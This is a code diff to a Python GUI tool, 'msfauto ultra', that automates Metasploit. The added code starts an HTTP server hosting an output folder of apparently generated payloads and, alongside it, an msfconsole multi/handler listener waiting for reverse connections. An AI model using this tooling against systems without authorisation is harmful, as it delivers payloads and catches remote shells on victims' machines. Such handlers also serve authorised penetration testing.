@@ -34,6 +34,18 @@ class msfauto_ultra():
         print(Style.BRIGHT + Fore.GREEN + "Starting msfconsole...\n")
         msfconsole = subprocess.Popen(f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"', shell=True)
         msfconsole.wait()
+    def start_together(self):
+        command1 = f"cd Output && python3 -m http.server {self.port2} -b {self.ip}"
+        process1 = subprocess.Popen(command1, shell=True)
+
+        # Command 2
+        command2 = f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"'
+        process2 = subprocess.Popen(command2, shell=True)
+
+        # Wait for both processes to finish
+        process1.wait()
+        process2.wait()
+
 def banner():
     banners = {
         1 : f"""{Fore.CYAN}
@@ -133,10 +145,10 @@ def read_info():
     return msfultra
 def mainapp():
     root = Tk()
-    def console_dot_py(): os.system("python3 console.py")
-    def server_dot_py(): os.system("python3 server.py")
-    Button(root, text="Start msfconsole", width=50, height=5,  command=console_dot_py).pack()
-    Button(root, text="Start server", width=50, height=5, command=server_dot_py).pack()
+    # def console_dot_py(): os.system("python3 console.py")
+    # def server_dot_py(): os.system("python3 server.py")
+    # Button(root, text="Start msfconsole", width=50, height=5,  command=console_dot_py).pack()
+    # Button(root, text="Start server", width=50, height=5, command=server_dot_py).pack()
     with open("config", "r") as read:
         reader = read.readlines()
         reader = "".join(reader)
@@ -146,9 +158,12 @@ def mainapp():
     port_one = reader[2]
     port_two = reader[3] 
     payload = reader[4]
-    Label(root, text=f""" Your IP is: {ip}
+    Label(root, text=f"""Starting all commands!
+ Your IP is: {ip}
 Your first port is: {port_one}
       Your second port is: {port_two}""").pack()
+    msfultra = read_info()
+    msfultra.start_together()
     root.resizable(False, False)
     root.title("msfauto ultra")
     root.mainloop()
